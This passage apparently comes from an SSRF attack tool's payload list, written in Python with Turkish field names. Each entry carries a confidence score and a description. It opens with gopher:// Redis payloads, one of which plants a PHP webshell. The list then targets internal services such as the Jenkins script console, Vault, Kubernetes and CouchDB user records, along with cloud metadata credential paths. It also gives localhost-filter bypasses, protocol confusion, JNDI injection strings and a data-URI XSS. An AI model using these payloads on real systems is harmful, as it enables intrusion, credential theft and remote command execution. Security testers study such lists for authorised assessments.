    {"payload": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0ax%0d%0a$57%0d%0a%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0d%0a", "guven": 0.95, "aciklama": "Gopher Redis PHP webshell"},
    {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0asave%0d%0a", "guven": 0.9, "aciklama": "Gopher Redis save command"},
    {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0abgsave%0d%0a", "guven": 0.85, "aciklama": "Gopher Redis background save"},
    
    # MongoDB Exploitation
    {"payload": "http://127.0.0.1:27017/", "guven": 0.8, "aciklama": "MongoDB HTTP interface"},
    {"payload": "http://127.0.0.1:28017/", "guven": 0.8, "aciklama": "MongoDB web interface"},
    {"payload": "gopher://127.0.0.1:27017/_", "guven": 0.8, "aciklama": "Gopher MongoDB connection"},
    {"payload": "http://127.0.0.1:27017/admin", "guven": 0.85, "aciklama": "MongoDB admin database"},
    {"payload": "http://127.0.0.1:27017/test", "guven": 0.8, "aciklama": "MongoDB test database"},
    {"payload": "http://127.0.0.1:27017/local", "guven": 0.85, "aciklama": "MongoDB local database"},
    {"payload": "http://127.0.0.1:27017/config", "guven": 0.85, "aciklama": "MongoDB config database"},
    
    # Elasticsearch Exploitation
    {"payload": "http://127.0.0.1:9200/_cluster/health", "guven": 0.85, "aciklama": "Elasticsearch cluster health"},
    {"payload": "http://127.0.0.1:9200/_nodes", "guven": 0.85, "aciklama": "Elasticsearch nodes"},
    {"payload": "http://127.0.0.1:9200/_cat/indices", "guven": 0.9, "aciklama": "Elasticsearch indices"},
    {"payload": "http://127.0.0.1:9200/_all/_search", "guven": 0.95, "aciklama": "Elasticsearch search all"},
    {"payload": "http://127.0.0.1:9200/_cluster/settings", "guven": 0.9, "aciklama": "Elasticsearch cluster settings"},
    {"payload": "http://127.0.0.1:9200/_cat/shards", "guven": 0.85, "aciklama": "Elasticsearch shards"},
    {"payload": "http://127.0.0.1:9200/_snapshot", "guven": 0.85, "aciklama": "Elasticsearch snapshots"},
    {"payload": "http://127.0.0.1:9200/_tasks", "guven": 0.8, "aciklama": "Elasticsearch tasks"},
    {"payload": "http://127.0.0.1:9200/_mapping", "guven": 0.85, "aciklama": "Elasticsearch mappings"},
    {"payload": "http://127.0.0.1:9200/_aliases", "guven": 0.8, "aciklama": "Elasticsearch aliases"},
    
    # CouchDB Exploitation
    {"payload": "http://127.0.0.1:5984/_all_dbs", "guven": 0.9, "aciklama": "CouchDB all databases"},
    {"payload": "http://127.0.0.1:5984/_users/_all_docs", "guven": 0.95, "aciklama": "CouchDB users database"},
    {"payload": "http://127.0.0.1:5984/_replicator", "guven": 0.85, "aciklama": "CouchDB replicator"},
    {"payload": "http://127.0.0.1:5984/_utils/", "guven": 0.85, "aciklama": "CouchDB utils interface"},
    {"payload": "http://127.0.0.1:5984/_config", "guven": 0.9, "aciklama": "CouchDB configuration"},
    {"payload": "http://127.0.0.1:5984/_stats", "guven": 0.8, "aciklama": "CouchDB statistics"},
    {"payload": "http://127.0.0.1:5984/_active_tasks", "guven": 0.8, "aciklama": "CouchDB active tasks"},
    {"payload": "http://127.0.0.1:5984/_membership", "guven": 0.85, "aciklama": "CouchDB membership"},
    
    # Apache Solr Exploitation
    {"payload": "http://127.0.0.1:8983/solr/admin/cores", "guven": 0.9, "aciklama": "Solr admin cores"},
    {"payload": "http://127.0.0.1:8983/solr/admin/collections", "guven": 0.85, "aciklama": "Solr collections"},
    {"payload": "http://127.0.0.1:8983/solr/admin/info/system", "guven": 0.85, "aciklama": "Solr system info"},
    {"payload": "http://127.0.0.1:8983/solr/admin/info/properties", "guven": 0.9, "aciklama": "Solr properties"},
    {"payload": "http://127.0.0.1:8983/solr/admin/configs", "guven": 0.9, "aciklama": "Solr configurations"},
    {"payload": "http://127.0.0.1:8983/solr/admin/metrics", "guven": 0.8, "aciklama": "Solr metrics"},
    
    # Jenkins Exploitation
    {"payload": "http://127.0.0.1:8080/jenkins/", "guven": 0.85, "aciklama": "Jenkins dashboard"},
    {"payload": "http://127.0.0.1:8080/jenkins/script", "guven": 0.95, "aciklama": "Jenkins script console"},
    {"payload": "http://127.0.0.1:8080/jenkins/cli", "guven": 0.9, "aciklama": "Jenkins CLI"},
    {"payload": "http://127.0.0.1:8080/jenkins/manage", "guven": 0.9, "aciklama": "Jenkins management"},
    {"payload": "http://127.0.0.1:8080/jenkins/systemInfo", "guven": 0.85, "aciklama": "Jenkins system info"},
    {"payload": "http://127.0.0.1:8080/jenkins/env-vars.html", "guven": 0.85, "aciklama": "Jenkins environment variables"},
    {"payload": "http://127.0.0.1:8080/jenkins/people", "guven": 0.8, "aciklama": "Jenkins users"},
    {"payload": "http://127.0.0.1:8080/jenkins/asynchPeople", "guven": 0.8, "aciklama": "Jenkins async people"},
    
    # GitLab/Git Services
    {"payload": "http://127.0.0.1:3000/", "guven": 0.8, "aciklama": "GitLab/Gitea instance"},
    {"payload": "http://127.0.0.1:3000/.git/config", "guven": 0.9, "aciklama": "Git config exposure"},
    {"payload": "http://127.0.0.1:3000/.git/HEAD", "guven": 0.85, "aciklama": "Git HEAD exposure"},
    {"payload": "http://127.0.0.1:3000/.git/logs/HEAD", "guven": 0.9, "aciklama": "Git logs exposure"},
    {"payload": "http://127.0.0.1:3000/admin", "guven": 0.85, "aciklama": "GitLab admin panel"},
    {"payload": "http://127.0.0.1:3000/api/v4/projects", "guven": 0.9, "aciklama": "GitLab API projects"},
    {"payload": "http://127.0.0.1:3000/api/v4/users", "guven": 0.9, "aciklama": "GitLab API users"},
    
    # Nexus Repository
    {"payload": "http://127.0.0.1:8081/nexus/", "guven": 0.8, "aciklama": "Nexus repository"},
    {"payload": "http://127.0.0.1:8081/service/rest/v1/repositories", "guven": 0.85, "aciklama": "Nexus repositories API"},
    {"payload": "http://127.0.0.1:8081/service/rest/v1/components", "guven": 0.85, "aciklama": "Nexus components API"},
    {"payload": "http://127.0.0.1:8081/service/rest/v1/security/users", "guven": 0.9, "aciklama": "Nexus users API"},
    {"payload": "http://127.0.0.1:8081/nexus/content/repositories/", "guven": 0.85, "aciklama": "Nexus content repositories"},
    
    # Artifactory
    {"payload": "http://127.0.0.1:8081/artifactory/", "guven": 0.8, "aciklama": "Artifactory instance"},
    {"payload": "http://127.0.0.1:8081/artifactory/api/system/ping", "guven": 0.8, "aciklama": "Artifactory ping"},
    {"payload": "http://127.0.0.1:8081/artifactory/api/repositories", "guven": 0.85, "aciklama": "Artifactory repositories"},
    {"payload": "http://127.0.0.1:8081/artifactory/api/security/users", "guven": 0.9, "aciklama": "Artifactory users"},
    {"payload": "http://127.0.0.1:8081/artifactory/webapp/", "guven": 0.8, "aciklama": "Artifactory webapp"},
    
    # Apache Kafka
    {"payload": "http://127.0.0.1:9092/", "guven": 0.8, "aciklama": "Kafka broker"},
    {"payload": "http://127.0.0.1:8080/", "guven": 0.8, "aciklama": "Kafka REST proxy"},
    {"payload": "http://127.0.0.1:8081/", "guven": 0.8, "aciklama": "Schema registry"},
    {"payload": "http://127.0.0.1:9021/", "guven": 0.8, "aciklama": "Kafka control center"},
    {"payload": "http://127.0.0.1:8082/", "guven": 0.8, "aciklama": "Kafka connect"},
    
    # RabbitMQ
    {"payload": "http://127.0.0.1:15672/", "guven": 0.85, "aciklama": "RabbitMQ management"},
    {"payload": "http://127.0.0.1:15672/api/overview", "guven": 0.85, "aciklama": "RabbitMQ API overview"},
    {"payload": "http://127.0.0.1:15672/api/users", "guven": 0.9, "aciklama": "RabbitMQ users"},
    {"payload": "http://127.0.0.1:15672/api/vhosts", "guven": 0.85, "aciklama": "RabbitMQ virtual hosts"},
    {"payload": "http://127.0.0.1:15672/api/queues", "guven": 0.85, "aciklama": "RabbitMQ queues"},
    {"payload": "http://127.0.0.1:5672/", "guven": 0.8, "aciklama": "RabbitMQ AMQP port"},
    
    # Apache ActiveMQ
    {"payload": "http://127.0.0.1:8161/admin/", "guven": 0.85, "aciklama": "ActiveMQ admin console"},
    {"payload": "http://127.0.0.1:8161/api/jolokia/", "guven": 0.9, "aciklama": "ActiveMQ Jolokia API"},
    {"payload": "http://127.0.0.1:61616/", "guven": 0.8, "aciklama": "ActiveMQ broker"},
    {"payload": "http://127.0.0.1:8161/hawtio/", "guven": 0.85, "aciklama": "ActiveMQ HawtIO"},
    
    # Apache Zookeeper
    {"payload": "http://127.0.0.1:2181/", "guven": 0.8, "aciklama": "Zookeeper client port"},
    {"payload": "http://127.0.0.1:8080/commands", "guven": 0.85, "aciklama": "Zookeeper commands"},
    {"payload": "http://127.0.0.1:8080/commands/stat", "guven": 0.8, "aciklama": "Zookeeper stat command"},
    {"payload": "http://127.0.0.1:8080/commands/conf", "guven": 0.85, "aciklama": "Zookeeper config"},
    {"payload": "http://127.0.0.1:8080/commands/envi", "guven": 0.8, "aciklama": "Zookeeper environment"},
    
    # Prometheus/Grafana
    {"payload": "http://127.0.0.1:9090/", "guven": 0.8, "aciklama": "Prometheus server"},
    {"payload": "http://127.0.0.1:9090/api/v1/query", "guven": 0.85, "aciklama": "Prometheus query API"},
    {"payload": "http://127.0.0.1:9090/api/v1/targets", "guven": 0.85, "aciklama": "Prometheus targets"},
    {"payload": "http://127.0.0.1:9090/config", "guven": 0.9, "aciklama": "Prometheus configuration"},
    {"payload": "http://127.0.0.1:3000/", "guven": 0.8, "aciklama": "Grafana dashboard"},
    {"payload": "http://127.0.0.1:3000/api/admin/users", "guven": 0.9, "aciklama": "Grafana admin users"},
    {"payload": "http://127.0.0.1:3000/api/datasources", "guven": 0.85, "aciklama": "Grafana datasources"},
    
    # InfluxDB
    {"payload": "http://127.0.0.1:8086/", "guven": 0.8, "aciklama": "InfluxDB server"},
    {"payload": "http://127.0.0.1:8086/query", "guven": 0.85, "aciklama": "InfluxDB query endpoint"},
    {"payload": "http://127.0.0.1:8086/debug/vars", "guven": 0.85, "aciklama": "InfluxDB debug vars"},
    {"payload": "http://127.0.0.1:8086/ping", "guven": 0.8, "aciklama": "InfluxDB ping"},
    {"payload": "http://127.0.0.1:8083/", "guven": 0.8, "aciklama": "InfluxDB admin interface"},
    
    # Time-series and Monitoring
    {"payload": "http://127.0.0.1:8428/", "guven": 0.8, "aciklama": "VictoriaMetrics"},
    {"payload": "http://127.0.0.1:9093/", "guven": 0.8, "aciklama": "Alertmanager"},
    {"payload": "http://127.0.0.1:9100/metrics", "guven": 0.8, "aciklama": "Node exporter metrics"},
    {"payload": "http://127.0.0.1:8080/actuator/", "guven": 0.85, "aciklama": "Spring Boot actuator"},
    {"payload": "http://127.0.0.1:8080/actuator/health", "guven": 0.8, "aciklama": "Spring actuator health"},
    {"payload": "http://127.0.0.1:8080/actuator/info", "guven": 0.8, "aciklama": "Spring actuator info"},
    {"payload": "http://127.0.0.1:8080/actuator/env", "guven": 0.9, "aciklama": "Spring actuator environment"},
    {"payload": "http://127.0.0.1:8080/actuator/configprops", "guven": 0.85, "aciklama": "Spring actuator config"},
    {"payload": "http://127.0.0.1:8080/actuator/beans", "guven": 0.8, "aciklama": "Spring actuator beans"},
    {"payload": "http://127.0.0.1:8080/actuator/mappings", "guven": 0.85, "aciklama": "Spring actuator mappings"},
    
    # Network Services Enumeration
    {"payload": "http://127.0.0.1:111/", "guven": 0.8, "aciklama": "RPC portmapper"},
    {"payload": "http://127.0.0.1:135/", "guven": 0.8, "aciklama": "Windows RPC endpoint"},
    {"payload": "http://127.0.0.1:139/", "guven": 0.8, "aciklama": "NetBIOS session"},
    {"payload": "http://127.0.0.1:445/", "guven": 0.8, "aciklama": "SMB port"},
    {"payload": "http://127.0.0.1:2049/", "guven": 0.8, "aciklama": "NFS port"},
    {"payload": "http://127.0.0.1:623/", "guven": 0.8, "aciklama": "IPMI port"},
    {"payload": "http://127.0.0.1:631/", "guven": 0.8, "aciklama": "CUPS printing"},
    {"payload": "http://127.0.0.1:902/", "guven": 0.8, "aciklama": "VMware auth daemon"},
    {"payload": "http://127.0.0.1:5900/", "guven": 0.8, "aciklama": "VNC port"},
    {"payload": "http://127.0.0.1:5901/", "guven": 0.8, "aciklama": "VNC port 2"},
    {"payload": "http://127.0.0.1:3389/", "guven": 0.8, "aciklama": "RDP port"},
    
    # Database Management Interfaces
    {"payload": "http://127.0.0.1:8080/phpmyadmin/", "guven": 0.85, "aciklama": "phpMyAdmin interface"},
    {"payload": "http://127.0.0.1/phpmyadmin/", "guven": 0.85, "aciklama": "phpMyAdmin root path"},
    {"payload": "http://127.0.0.1:8080/adminer/", "guven": 0.85, "aciklama": "Adminer interface"},
    {"payload": "http://127.0.0.1/adminer.php", "guven": 0.85, "aciklama": "Adminer PHP file"},
    {"payload": "http://127.0.0.1:1234/", "guven": 0.8, "aciklama": "Redis Commander"},
    {"payload": "http://127.0.0.1:8081/", "guven": 0.8, "aciklama": "Redis web UI"},
    {"payload": "http://127.0.0.1:3000/", "guven": 0.8, "aciklama": "Mongo Express"},
    {"payload": "http://127.0.0.1:28017/", "guven": 0.8, "aciklama": "MongoDB web status"},
    
    # Cloud Provider Services
    {"payload": "http://100.100.100.200/latest/meta-data/", "guven": 0.9, "aciklama": "Alibaba Cloud metadata"},
    {"payload": "http://100.100.100.200/latest/meta-data/instance-id", "guven": 0.85, "aciklama": "Alibaba instance ID"},
    {"payload": "http://100.100.100.200/latest/meta-data/ram/security-credentials/", "guven": 0.95, "aciklama": "Alibaba RAM credentials"},
    {"payload": "http://169.254.21.51/computeMetadata/v1/", "guven": 0.9, "aciklama": "Oracle Cloud metadata"},
    {"payload": "http://169.254.21.51/opc/v1/instance/", "guven": 0.9, "aciklama": "Oracle Cloud instance"},
    {"payload": "http://169.254.21.51/opc/v1/vnics/", "guven": 0.85, "aciklama": "Oracle Cloud VNICs"},
    
    # Additional Bypass Techniques
    {"payload": "http://127.000.000.001/", "guven": 0.8, "aciklama": "Zero-padded IP"},
    {"payload": "http://127.0.0.1.xip.io/", "guven": 0.85, "aciklama": "Wildcard DNS bypass"},
    {"payload": "http://127.0.0.1.nip.io/", "guven": 0.85, "aciklama": "NIP.IO DNS bypass"},
    {"payload": "http://127.0.0.1.sslip.io/", "guven": 0.85, "aciklama": "SSLIP.IO DNS bypass"},
    {"payload": "http://localtest.me/", "guven": 0.85, "aciklama": "Localtest.me bypass"},
    {"payload": "http://vcap.me/", "guven": 0.8, "aciklama": "VCAP.me bypass"},
    {"payload": "http://lvh.me/", "guven": 0.8, "aciklama": "LVH.me bypass"},
    {"payload": "http://lacolhost.com/", "guven": 0.8, "aciklama": "Typosquatting bypass"},
    {"payload": "http://localh0st.net/", "guven": 0.8, "aciklama": "Zero substitution bypass"},
    {"payload": "http://127.1.1.1/", "guven": 0.8, "aciklama": "Alternative local IP"},
    {"payload": "http://127.10.10.10/", "guven": 0.8, "aciklama": "Class A private bypass"},
    
    # Advanced Encoding Bypasses
    {"payload": "http://127.0.0.1%09/", "guven": 0.8, "aciklama": "Tab character bypass"},
    {"payload": "http://127.0.0.1%0a/", "guven": 0.8, "aciklama": "Newline character bypass"},
    {"payload": "http://127.0.0.1%0d/", "guven": 0.8, "aciklama": "Carriage return bypass"},
    {"payload": "http://127.0.0.1%20/", "guven": 0.8, "aciklama": "Space character bypass"},
    {"payload": "http://127.0.0.1%00/", "guven": 0.8, "aciklama": "Null byte bypass"},
    {"payload": "http://127.0.0.1%ff/", "guven": 0.8, "aciklama": "High byte bypass"},
    {"payload": "http://127.0.0.1../", "guven": 0.8, "aciklama": "Path traversal bypass"},
    {"payload": "http://127.0.0.1....//", "guven": 0.8, "aciklama": "Multiple dot bypass"},
    {"payload": "http://127.0.0.1/./", "guven": 0.8, "aciklama": "Current directory bypass"},
    {"payload": "http://127.0.0.1/.../", "guven": 0.8, "aciklama": "Triple dot bypass"},
    {"payload": "http://127.0.0.1/.././", "guven": 0.8, "aciklama": "Combined traversal bypass"},
    {"payload": "http://127.0.0.1;/", "guven": 0.8, "aciklama": "Semicolon bypass"},
    {"payload": "http://127.0.0.1?/", "guven": 0.8, "aciklama": "Query parameter bypass"},
    {"payload": "http://127.0.0.1#/", "guven": 0.8, "aciklama": "Fragment bypass"},
    {"payload": "http://127.0.0.1&/", "guven": 0.8, "aciklama": "Ampersand bypass"},
    
    # Protocol Confusion
    {"payload": "https://127.0.0.1:80/", "guven": 0.8, "aciklama": "HTTPS on HTTP port"},
    {"payload": "http://127.0.0.1:443/", "guven": 0.8, "aciklama": "HTTP on HTTPS port"},
    {"payload": "ftp://127.0.0.1:80/", "guven": 0.8, "aciklama": "FTP on HTTP port"},
    {"payload": "ftps://127.0.0.1:80/", "guven": 0.8, "aciklama": "FTPS on HTTP port"},
    {"payload": "ssh://127.0.0.1:80/", "guven": 0.8, "aciklama": "SSH on HTTP port"},
    {"payload": "telnet://127.0.0.1:80/", "guven": 0.8, "aciklama": "Telnet on HTTP port"},
    {"payload": "imap://127.0.0.1:80/", "guven": 0.8, "aciklama": "IMAP on HTTP port"},
    {"payload": "pop3://127.0.0.1:80/", "guven": 0.8, "aciklama": "POP3 on HTTP port"},
    {"payload": "smtp://127.0.0.1:80/", "guven": 0.8, "aciklama": "SMTP on HTTP port"},
    {"payload": "news://127.0.0.1:80/", "guven": 0.8, "aciklama": "NNTP on HTTP port"},
    
    # Alternative Protocols
    {"payload": "jar://127.0.0.1!/", "guven": 0.85, "aciklama": "JAR protocol"},
    {"payload": "netdoc://127.0.0.1/", "guven": 0.8, "aciklama": "Netdoc protocol"},
    {"payload": "ogg://127.0.0.1/", "guven": 0.75, "aciklama": "OGG protocol"},
    {"payload": "expect://127.0.0.1/", "guven": 0.8, "aciklama": "Expect protocol"},
    {"payload": "php://filter/resource=127.0.0.1", "guven": 0.85, "aciklama": "PHP filter protocol"},
    {"payload": "php://input", "guven": 0.9, "aciklama": "PHP input stream"},
    {"payload": "data://text/plain,SSRF", "guven": 0.8, "aciklama": "Data URI protocol"},
    {"payload": "data:text/html,<script>alert('SSRF')</script>", "guven": 0.85, "aciklama": "Data URI XSS"},
    {"payload": "mailto://user@127.0.0.1", "guven": 0.75, "aciklama": "Mailto protocol"},
    {"payload": "compress.zlib://127.0.0.1", "guven": 0.8, "aciklama": "Zlib compression wrapper"},
    {"payload": "compress.bzip2://127.0.0.1", "guven": 0.8, "aciklama": "Bzip2 compression wrapper"},
    
    # Java-specific Protocols
    {"payload": "jar:http://127.0.0.1!/", "guven": 0.85, "aciklama": "JAR HTTP protocol"},
    {"payload": "jar:file:///tmp/evil.jar!/", "guven": 0.9, "aciklama": "JAR file protocol"},
    {"payload": "netdoc:http://127.0.0.1/", "guven": 0.8, "aciklama": "Netdoc HTTP"},
    {"payload": "jndi:ldap://127.0.0.1:389/", "guven": 0.95, "aciklama": "JNDI LDAP injection"},
    {"payload": "jndi:dns://127.0.0.1/", "guven": 0.9, "aciklama": "JNDI DNS lookup"},
    {"payload": "jndi:rmi://127.0.0.1:1099/", "guven": 0.95, "aciklama": "JNDI RMI connection"},
    {"payload": "rmi://127.0.0.1:1099/", "guven": 0.9, "aciklama": "RMI protocol"},
    {"payload": "iiop://127.0.0.1:900/", "guven": 0.85, "aciklama": "IIOP protocol"},
    {"payload": "corba://127.0.0.1:900/", "guven": 0.8, "aciklama": "CORBA protocol"},
    
    # Network Interface Bypasses
    {"payload": "http://0.0.0.0:8080/", "guven": 0.8, "aciklama": "All interfaces binding"},
    {"payload": "http://::1:8080/", "guven": 0.8, "aciklama": "IPv6 loopback with port"},
    {"payload": "http://[::]:8080/", "guven": 0.8, "aciklama": "IPv6 any address"},
    {"payload": "http://[::ffff:0:0]/", "guven": 0.8, "aciklama": "IPv6 zero mapping"},
    {"payload": "http://[2001:db8::1]/", "guven": 0.75, "aciklama": "IPv6 documentation range"},
    {"payload": "http://[fe80::1]/", "guven": 0.8, "aciklama": "IPv6 link-local"},
    {"payload": "http://[fc00::1]/", "guven": 0.8, "aciklama": "IPv6 unique local"},
    {"payload": "http://[fd00::1]/", "guven": 0.8, "aciklama": "IPv6 unique local 2"},
    
    # Private Network Ranges
    {"payload": "http://10.0.0.1/", "guven": 0.85, "aciklama": "Class A private network"},
    {"payload": "http://172.16.0.1/", "guven": 0.85, "aciklama": "Class B private network"},
    {"payload": "http://192.168.1.1/", "guven": 0.85, "aciklama": "Class C private network"},
    {"payload": "http://192.168.0.1/", "guven": 0.85, "aciklama": "Common router IP"},
    {"payload": "http://10.10.10.10/", "guven": 0.8, "aciklama": "Common internal IP"},
    {"payload": "http://172.17.0.1/", "guven": 0.8, "aciklama": "Docker default gateway"},
    {"payload": "http://172.18.0.1/", "guven": 0.8, "aciklama": "Docker network gateway"},
    {"payload": "http://10.0.2.2/", "guven": 0.8, "aciklama": "VirtualBox host IP"},
    {"payload": "http://192.168.56.1/", "guven": 0.8, "aciklama": "VirtualBox host-only"},
    
    # Link-Local and Special Use
    {"payload": "http://169.254.1.1/", "guven": 0.8, "aciklama": "Link-local address"},
    {"payload": "http://224.0.0.1/", "guven": 0.75, "aciklama": "Multicast address"},
    {"payload": "http://255.255.255.255/", "guven": 0.75, "aciklama": "Broadcast address"},
    {"payload": "http://198.18.0.1/", "guven": 0.75, "aciklama": "Benchmark testing"},
    {"payload": "http://203.0.113.1/", "guven": 0.75, "aciklama": "Documentation range"},
    {"payload": "http://233.252.0.1/", "guven": 0.75, "aciklama": "MCAST-TEST-NET"},
    
    # Special Domains and Subdomains
    {"payload": "http://internal.company.com/", "guven": 0.85, "aciklama": "Internal domain"},
    {"payload": "http://admin.localhost/", "guven": 0.85, "aciklama": "Admin subdomain"},
    {"payload": "http://api.localhost/", "guven": 0.8, "aciklama": "API subdomain"},
    {"payload": "http://dev.localhost/", "guven": 0.8, "aciklama": "Development subdomain"},
    {"payload": "http://test.localhost/", "guven": 0.8, "aciklama": "Test subdomain"},
    {"payload": "http://staging.localhost/", "guven": 0.8, "aciklama": "Staging subdomain"},
    {"payload": "http://db.localhost/", "guven": 0.85, "aciklama": "Database subdomain"},
    {"payload": "http://cache.localhost/", "guven": 0.8, "aciklama": "Cache subdomain"},
    {"payload": "http://mail.localhost/", "guven": 0.8, "aciklama": "Mail subdomain"},
    {"payload": "http://ftp.localhost/", "guven": 0.8, "aciklama": "FTP subdomain"},
    
    # Service Discovery Endpoints
    {"payload": "http://127.0.0.1:8500/v1/catalog/services", "guven": 0.9, "aciklama": "Consul service catalog"},
    {"payload": "http://127.0.0.1:2379/v2/keys/_coreos.com/fleet/", "guven": 0.9, "aciklama": "Fleet service discovery"},
    {"payload": "http://127.0.0.1:4001/v2/keys/", "guven": 0.85, "aciklama": "etcd v2 discovery"},
    {"payload": "http://127.0.0.1:8080/v1/services", "guven": 0.8, "aciklama": "Generic service discovery"},
    {"payload": "http://127.0.0.1:53/", "guven": 0.8, "aciklama": "DNS service"},
    
    # Container Orchestration
    {"payload": "http://127.0.0.1:5000/v2/_catalog", "guven": 0.85, "aciklama": "Docker registry catalog"},
    {"payload": "http://127.0.0.1:5000/v2/ubuntu/tags/list", "guven": 0.8, "aciklama": "Docker registry tags"},
    {"payload": "http://127.0.0.1:2376/info", "guven": 0.85, "aciklama": "Docker daemon info"},
    {"payload": "http://127.0.0.1:2376/images/json", "guven": 0.85, "aciklama": "Docker images list"},
    {"payload": "http://127.0.0.1:8080/api/v1/nodes", "guven": 0.9, "aciklama": "Kubernetes nodes"},
    {"payload": "http://127.0.0.1:8080/api/v1/pods", "guven": 0.9, "aciklama": "Kubernetes pods list"},
    {"payload": "http://127.0.0.1:4040/api/v1/applications", "guven": 0.8, "aciklama": "Spark applications"},
    {"payload": "http://127.0.0.1:8088/ws/v1/cluster/info", "guven": 0.8, "aciklama": "Hadoop YARN cluster"},
    {"payload": "http://127.0.0.1:50070/jmx", "guven": 0.8, "aciklama": "Hadoop NameNode JMX"},
    {"payload": "http://127.0.0.1:8042/ws/v1/node/info", "guven": 0.8, "aciklama": "Hadoop NodeManager"},
    
    # Message Queues and Streaming
    {"payload": "http://127.0.0.1:15674/", "guven": 0.8, "aciklama": "RabbitMQ STOMP"},
    {"payload": "http://127.0.0.1:15675/", "guven": 0.8, "aciklama": "RabbitMQ MQTT"},
    {"payload": "http://127.0.0.1:1883/", "guven": 0.8, "aciklama": "MQTT broker"},
    {"payload": "http://127.0.0.1:8883/", "guven": 0.8, "aciklama": "MQTT SSL broker"},
    {"payload": "http://127.0.0.1:4222/", "guven": 0.8, "aciklama": "NATS messaging"},
    {"payload": "http://127.0.0.1:6222/", "guven": 0.8, "aciklama": "NATS routing"},
    {"payload": "http://127.0.0.1:8222/", "guven": 0.8, "aciklama": "NATS monitoring"},
    {"payload": "http://127.0.0.1:9092/", "guven": 0.8, "aciklama": "Kafka broker"},
    {"payload": "http://127.0.0.1:2181/", "guven": 0.8, "aciklama": "Zookeeper ensemble"},
    
    # Development and Debug Interfaces
    {"payload": "http://127.0.0.1:4000/", "guven": 0.8, "aciklama": "Development server"},
    {"payload": "http://127.0.0.1:5000/", "guven": 0.8, "aciklama": "Flask development"},
    {"payload": "http://127.0.0.1:8000/", "guven": 0.8, "aciklama": "Django development"},
    {"payload": "http://127.0.0.1:3000/", "guven": 0.8, "aciklama": "Node.js development"},
    {"payload": "http://127.0.0.1:9229/", "guven": 0.85, "aciklama": "Node.js debug port"},
    {"payload": "http://127.0.0.1:5858/", "guven": 0.85, "aciklama": "Node.js legacy debug"},
    {"payload": "http://127.0.0.1:9222/", "guven": 0.85, "aciklama": "Chrome DevTools"},
    {"payload": "http://127.0.0.1:35729/", "guven": 0.8, "aciklama": "LiveReload server"},
    {"payload": "http://127.0.0.1:8080/__debug__/", "guven": 0.85, "aciklama": "Debug endpoint"},
    {"payload": "http://127.0.0.1:8080/debug/", "guven": 0.85, "aciklama": "Debug interface"},
    
    # Build and CI/CD Tools
    {"payload": "http://127.0.0.1:8080/jenkins/", "guven": 0.85, "aciklama": "Jenkins CI"},
    {"payload": "http://127.0.0.1:8111/", "guven": 0.8, "aciklama": "TeamCity server"},
    {"payload": "http://127.0.0.1:8153/", "guven": 0.8, "aciklama": "GoCD server"},
    {"payload": "http://127.0.0.1:5050/", "guven": 0.8, "aciklama": "Mesos master"},
    {"payload": "http://127.0.0.1:8080/bamboo/", "guven": 0.8, "aciklama": "Atlassian Bamboo"},
    {"payload": "http://127.0.0.1:9000/", "guven": 0.8, "aciklama": "SonarQube server"},
    {"payload": "http://127.0.0.1:8080/artifactory/", "guven": 0.8, "aciklama": "JFrog Artifactory"},
    {"payload": "http://127.0.0.1:8081/nexus/", "guven": 0.8, "aciklama": "Sonatype Nexus"},
    
    # API Gateways and Proxies
    {"payload": "http://127.0.0.1:8001/", "guven": 0.8, "aciklama": "Kong API Gateway"},
    {"payload": "http://127.0.0.1:15000/", "guven": 0.8, "aciklama": "Envoy admin interface"},
    {"payload": "http://127.0.0.1:8080/v1/", "guven": 0.8, "aciklama": "API v1 endpoint"},
    {"payload": "http://127.0.0.1:8080/api/", "guven": 0.8, "aciklama": "Generic API endpoint"},
    {"payload": "http://127.0.0.1:8080/health/", "guven": 0.8, "aciklama": "Health check endpoint"},
    {"payload": "http://127.0.0.1:8080/status/", "guven": 0.8, "aciklama": "Status endpoint"},
    {"payload": "http://127.0.0.1:8080/metrics/", "guven": 0.8, "aciklama": "Metrics endpoint"},
    {"payload": "http://127.0.0.1:1080/", "guven": 0.8, "aciklama": "MockServer"},
    {"payload": "http://127.0.0.1:3128/", "guven": 0.8, "aciklama": "Squid proxy"},
    {"payload": "http://127.0.0.1:8888/", "guven": 0.8, "aciklama": "HTTP proxy"},
    
    # Security and Authentication
    {"payload": "http://127.0.0.1:8080/auth/", "guven": 0.85, "aciklama": "Authentication endpoint"},
    {"payload": "http://127.0.0.1:8080/oauth/", "guven": 0.85, "aciklama": "OAuth endpoint"},
    {"payload": "http://127.0.0.1:8080/saml/", "guven": 0.85, "aciklama": "SAML endpoint"},
    {"payload": "http://127.0.0.1:8080/jwt/", "guven": 0.85, "aciklama": "JWT endpoint"},
    {"payload": "http://127.0.0.1:8200/", "guven": 0.9, "aciklama": "HashiCorp Vault"},
    {"payload": "http://127.0.0.1:8200/v1/sys/health", "guven": 0.85, "aciklama": "Vault health check"},
    {"payload": "http://127.0.0.1:8080/keycloak/", "guven": 0.85, "aciklama": "Keycloak auth server"},
    {"payload": "http://127.0.0.1:9000/minio/", "guven": 0.8, "aciklama": "MinIO object storage"},
    
    # Time and NTP Services
    {"payload": "http://127.0.0.1:123/", "guven": 0.75, "aciklama": "NTP service"},
    {"payload": "http://127.0.0.1:37/", "guven": 0.75, "aciklama": "Time protocol"},
    {"payload": "http://127.0.0.1:13/", "guven": 0.75, "aciklama": "Daytime protocol"},
    
    # Gaming and Entertainment
    {"payload": "http://127.0.0.1:25565/", "guven": 0.75, "aciklama": "Minecraft server"},
    {"payload": "http://127.0.0.1:27015/", "guven": 0.75, "aciklama": "Steam/Source game"},
    {"payload": "http://127.0.0.1:7777/", "guven": 0.75, "aciklama": "Game server port"},
    
    # Backup and Storage
    {"payload": "http://127.0.0.1:8080/backup/", "guven": 0.8, "aciklama": "Backup service"},
    {"payload": "http://127.0.0.1:8080/restore/", "guven": 0.8, "aciklama": "Restore service"},
    {"payload": "http://127.0.0.1:873/", "guven": 0.8, "aciklama": "Rsync daemon"},
    {"payload": "http://127.0.0.1:8384/", "guven": 0.8, "aciklama": "Syncthing web UI"},
    {"payload": "http://127.0.0.1:3260/", "guven": 0.8, "aciklama": "iSCSI target"},
    
    # IoT and Embedded Devices
    {"payload": "http://127.0.0.1:1900/", "guven": 0.75, "aciklama": "UPnP SSDP"},
